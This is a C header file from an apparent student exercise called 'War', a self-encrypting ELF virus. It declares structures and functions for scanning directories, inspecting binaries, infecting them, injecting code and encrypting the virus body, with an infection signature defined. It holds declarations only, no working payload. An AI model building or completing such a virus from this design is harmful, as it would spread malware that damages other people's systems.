/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 15:13:39 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef WAR_H
# define WAR_H

/* Includes */
# include <elf.h>
# include <stdio.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <unistd.h>
# include <stdbool.h>
# include <sys/mman.h>
# include <stdlib.h>
# include <limits.h>

/* Enum */

/* Define */

# define SIGNATURE	0x216948	// 'Hi!'

# define USER_ENTRY	2
# define ROOT_ENTRY	4
# define BUFF_SIZE	2048

# define __INLINE__	__attribute__((always_inline)) inline


/* Structures */

typedef struct __attribute__ ((__packed__)) linux_dirent64
{
	__ino64_t			d_ino;          /* 64-bit inode number */
	__off64_t			d_off;          /* 64-bit offset to next structure */
	unsigned short int	d_reclen;       /* Size of this dirent */
	unsigned char		d_type;         /* File type */
	char				d_name[256];    /* Filename (null-terminated) */
}						linux_dirent64;

typedef struct	s_directory
{
	int			entry;
	char		path[4][16];
}				t_directory;

typedef struct	s_key
{
	size_t		one;
	size_t		two;
	size_t		junk[2];
}				t_key;

typedef struct	s_bin
{
	int			fd;
	int			pad;
	size_t		size;
	void		*map;
}				t_bin;

typedef struct	s_cypher
{
	Elf64_Phdr	*segment;
	Elf64_Shdr	*section;
	size_t		size;
}				t_cypher;

typedef struct	s_virus
{
	Elf64_Phdr	*data;
	Elf64_Phdr	*note;
	size_t		size;
}				t_virus;

typedef struct	s_data
{
	// core
	t_key		key;
	t_bin		bin;
	t_virus		virus;
	t_cypher	cypher;

	// misc
	Elf64_Ehdr	*header;
	Elf64_Addr	bin_entry;
	Elf64_Addr	vrs_entry;
	Elf64_Addr	cpr_entry;

	size_t		context;
}				t_data;

/* Core */
void			start(void);
void			cypher_beg(void);
void			war(t_data *data);
void			locate(t_data *data, t_directory *dir);
void			inspect(t_data *data, char *path);
void			infect(t_data *data);
void			inject(t_data *data);
void			release(t_data *data);
void			cypher_end(t_data *data);
void			end(void);

/*
**	Misc
*/
void			update_one(t_key *key, char *ptr, size_t size);
void			update_two(t_key *key, char *ptr, size_t size);
void			revert_one(t_key *key, char *ptr, size_t size);
void			revert_two(t_key *key, char *ptr, size_t size);
void			end_of_data(void);

#endif